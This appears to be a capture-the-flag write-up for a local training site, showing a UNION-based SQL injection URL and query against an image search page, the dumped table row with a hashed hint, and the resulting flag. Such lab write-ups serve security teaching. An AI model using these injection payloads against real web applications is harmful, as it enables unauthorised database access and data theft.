# Image SQL Injection Attack

We performed an SQL injection attack using the following URL:

```
http://localhost:8080/index.php?page=searchimg&id=-1+UNION+SELECT+1%2C+CONCAT%28id%2C+url%2C+title%2C+comment%29+FROM+list_images&Submit=Submit#
```

The query used was:

```
ID: -1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
```

We received the following result:

- **Title:** 5borntosec.ddns.net/images.pngHack me? If you read this just use this md5 decode lowercase then sha256 to win this flag! : 1928e8083cf461a51303633093573c46
- **Url:** 1

After following the instructions, we obtained the flag from [#file:flag.txt](#file:flag.txt-context).

Content of `flag.txt`:

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```